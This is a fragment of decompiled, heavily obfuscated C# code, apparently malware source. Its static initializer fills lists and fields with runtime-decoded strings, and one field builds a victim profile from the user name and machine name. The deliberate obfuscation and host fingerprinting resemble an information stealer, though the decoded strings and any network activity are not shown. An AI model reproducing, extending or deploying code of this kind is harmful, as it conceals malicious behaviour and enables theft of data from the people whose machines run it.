			HVpeMrZfkFlb(getString_0(107381058)),
			HVpeMrZfkFlb(getString_0(107381025)),
			HVpeMrZfkFlb(getString_0(107380992)),
			HVpeMrZfkFlb(getString_0(107380911)),
			HVpeMrZfkFlb(getString_0(107380882)),
			HVpeMrZfkFlb(getString_0(107380869)),
			HVpeMrZfkFlb(getString_0(107381304)),
			HVpeMrZfkFlb(getString_0(107381263)),
			HVpeMrZfkFlb(getString_0(107381206)),
			HVpeMrZfkFlb(getString_0(107381189)),
			HVpeMrZfkFlb(getString_0(107381160)),
			HVpeMrZfkFlb(getString_0(107413339))
		};
		ZiZdlGZQMKRIPJ = new List<string>
		{
			HVpeMrZfkFlb(getString_0(107413298)),
			HVpeMrZfkFlb(getString_0(107413281)),
			HVpeMrZfkFlb(getString_0(107413200)),
			HVpeMrZfkFlb(getString_0(107413183)),
			HVpeMrZfkFlb(getString_0(107413102)),
			HVpeMrZfkFlb(getString_0(107413549)),
			HVpeMrZfkFlb(getString_0(107413504)),
			HVpeMrZfkFlb(getString_0(107413443))
		};
		OuiVTcbGPHuSa = new List<string>
		{
			HVpeMrZfkFlb(getString_0(107413386)),
			HVpeMrZfkFlb(getString_0(107412841)),
			HVpeMrZfkFlb(getString_0(107412796)),
			HVpeMrZfkFlb(getString_0(107412747)),
			HVpeMrZfkFlb(getString_0(107412714)),
			HVpeMrZfkFlb(getString_0(107412633)),
			HVpeMrZfkFlb(getString_0(107412588)),
			HVpeMrZfkFlb(getString_0(107413099)),
			HVpeMrZfkFlb(getString_0(107413066)),
			HVpeMrZfkFlb(getString_0(107413033)),
			HVpeMrZfkFlb(getString_0(107413000)),
			HVpeMrZfkFlb(getString_0(107412967)),
			HVpeMrZfkFlb(getString_0(107412926)),
			HVpeMrZfkFlb(getString_0(107412853)),
			HVpeMrZfkFlb(getString_0(107412328)),
			HVpeMrZfkFlb(getString_0(107412295)),
			HVpeMrZfkFlb(getString_0(107412254)),
			HVpeMrZfkFlb(getString_0(107412221)),
			HVpeMrZfkFlb(getString_0(107412148)),
			HVpeMrZfkFlb(getString_0(107412139)),
			HVpeMrZfkFlb(getString_0(107412106)),
			HVpeMrZfkFlb(getString_0(107412577)),
			HVpeMrZfkFlb(getString_0(107412544)),
			HVpeMrZfkFlb(getString_0(107413386)),
			HVpeMrZfkFlb(getString_0(107412471)),
			HVpeMrZfkFlb(getString_0(107412430)),
			HVpeMrZfkFlb(getString_0(107412417)),
			HVpeMrZfkFlb(getString_0(107412384)),
			HVpeMrZfkFlb(getString_0(107411799)),
			HVpeMrZfkFlb(getString_0(107411758)),
			HVpeMrZfkFlb(getString_0(107411725)),
			HVpeMrZfkFlb(getString_0(107411716)),
			HVpeMrZfkFlb(getString_0(107411643)),
			HVpeMrZfkFlb(getString_0(107412841)),
			HVpeMrZfkFlb(getString_0(107411602)),
			HVpeMrZfkFlb(getString_0(107412796)),
			HVpeMrZfkFlb(getString_0(107411569)),
			HVpeMrZfkFlb(getString_0(107412048)),
			HVpeMrZfkFlb(getString_0(107412039)),
			HVpeMrZfkFlb(getString_0(107412006)),
			HVpeMrZfkFlb(getString_0(107411965)),
			HVpeMrZfkFlb(getString_0(107411892)),
			HVpeMrZfkFlb(getString_0(107411859)),
			HVpeMrZfkFlb(getString_0(107411826)),
			HVpeMrZfkFlb(getString_0(107411305)),
			HVpeMrZfkFlb(getString_0(107411264)),
			HVpeMrZfkFlb(getString_0(107411191))
		};
		KSsRoxGqodAS = new List<string>
		{
			HVpeMrZfkFlb(wToEnzHBmDVrI(getString_0(107411150))),
			HVpeMrZfkFlb(getString_0(107411133)),
			HVpeMrZfkFlb(getString_0(107411552)),
			HVpeMrZfkFlb(getString_0(107411455)),
			HVpeMrZfkFlb(getString_0(107411362)),
			HVpeMrZfkFlb(getString_0(107410753)),
			HVpeMrZfkFlb(getString_0(107410660)),
			HVpeMrZfkFlb(getString_0(107410563)),
			HVpeMrZfkFlb(getString_0(107410982)),
			HVpeMrZfkFlb(getString_0(107410885)),
			HVpeMrZfkFlb(getString_0(107410280)),
			HVpeMrZfkFlb(getString_0(107410183)),
			HVpeMrZfkFlb(getString_0(107410090)),
			HVpeMrZfkFlb(wToEnzHBmDVrI(getString_0(107411150)))
		};
		wbCfMjGPdcW = HVpeMrZfkFlb(getString_0(107410505));
		yRBEUVLZlAnEdd = new List<string>
		{
			HVpeMrZfkFlb(getString_0(107410360)),
			HVpeMrZfkFlb(getString_0(107409654)),
			HVpeMrZfkFlb(getString_0(107409972)),
			HVpeMrZfkFlb(getString_0(107409778)),
			HVpeMrZfkFlb(getString_0(107409072)),
			HVpeMrZfkFlb(getString_0(107409390))
		};
		hJJkXeuiqGz = new List<string>
		{
			HVpeMrZfkFlb(getString_0(107408684)),
			HVpeMrZfkFlb(getString_0(107408623)),
			HVpeMrZfkFlb(getString_0(107408562))
		};
		KCVoFSMpGXKlq = getString_0(107396732);
		dnZRGCoCklSHKY = getString_0(107396732);
		ZxIIqtiyuAl = new DateTime(2000, 1, 1);
		OHBfUHlZKqTDcuFxZ = new DateTime(2100, 1, 1);
		hmJvpQlaOPxs = getString_0(107397207);
		lULwGORTHsVbwb = getString_0(107391528);
		kIvaDzqPWp = getString_0(107396732);
		TMkyAWmFLSj = getString_0(107396732);
		LVGmgeLzZF = getString_0(107396732);
		KQCPbXDOxwnSPz = getString_0(107397207);
		LRMGeQPxsQADKTt = getString_0(107396732);
		uCcQuMnxchHHlJ = getString_0(107396732);
		ckZUdJlJosB = new List<string>
		{
			getString_0(107396133),
			getString_0(107395335),
			getString_0(107396167),
			getString_0(107395184)
		};
		GpxsQQwDuqzSQU = getString_0(107396732);
		ThgEusyzIrO = getString_0(107408501);
		VshFVTYmyC = getString_0(107396732);
		HfkLRUwddBKMzY = getString_0(107396732);
		BDoKuyssvLAVUQ = getString_0(107396732);
		HqoRxsyhnVRpC = string.Empty;
		gnUszaDrSLDy = getString_0(107396732);
		RpxGQyzSGFE = getString_0(107396732);
		mnelOchnJdlue = getString_0(107396732);
		BlWgBotOUWKVK = getString_0(107393277);
		FGewXxPlePtWzAIc = getString_0(107393277);
		voJHFutcHhirgW = getString_0(107396732);
		FXOQkWyVgPzV = getString_0(107396732);
		rvXTXOXThUg = getString_0(107397207);
		iMLGovPqphjoL = getString_0(107396732);
		rjIwTTOtnKJwKK = getString_0(107396732);
		vYWEvRHWptFC = getString_0(107408496);
		TlQacgMcOPd = getString_0(107396732);
		mODuARVBuKgY = getString_0(107396732);
		PtsBXekLcxalyC = getString_0(107408511);
		YsLgrKljrXrO = getString_0(107396732);
		gkEJVIxxfyJv = getString_0(107396732);
		wwRRAZOHtDyjcWOvh = getString_0(107396732);
		XtRHCUJWcllQ = getString_0(107396732);
		akiIqstUMMsd = getString_0(107409002);
		qBogYeVcWxAEz = getString_0(107397207);
		WEGQronBHL = getString_0(107396732);
		TPKWQWzHLdOhNlLo = getString_0(107396732);
		vnYzvmwacjUdjV = getString_0(107396732);
		JeQJajbHDJTGCnq = new string[0];
		qpGYoLASDOB = getString_0(107397207);
		aMtbjENTlvGs = true;
		aDkDTffAgEPC = getString_0(107396732);
		hWWikjLPcgd = false;
		DQPpYKEvQZUMRk = false;
		UpJWgNbiBYldazrH = false;
		yFKcqIFIcFhKJK = false;
		NPfFzxrRnHyw = getString_0(107408989);
		TiKXhRWKbmQI = false;
		keQUndsfsh = false;
		VBIWxnphgDj = false;
		YddgklTLPM = false;
		FwNVRjoRuJX = true;
		KAvrknWnpmp = getString_0(107408968) + Environment.UserName + getString_0(107408923) + Environment.MachineName + getString_0(107408934) + OoPMqxzMoPT.TuxvCREHhgWfT() + getString_0(107408929);
		vhEoviCVwfZQ = false;
		IUccTNmqwawM = new Stopwatch();
		bVOffGsglMxM = 0;
		LhieCrHWKTUqOfg = 0;
		hpyULordzdhq = true;
		UMHyeHuFiQnSyQ = getString_0(107408888) + OoPMqxzMoPT.TuxvCREHhgWfT() + getString_0(107408879);
	}
}
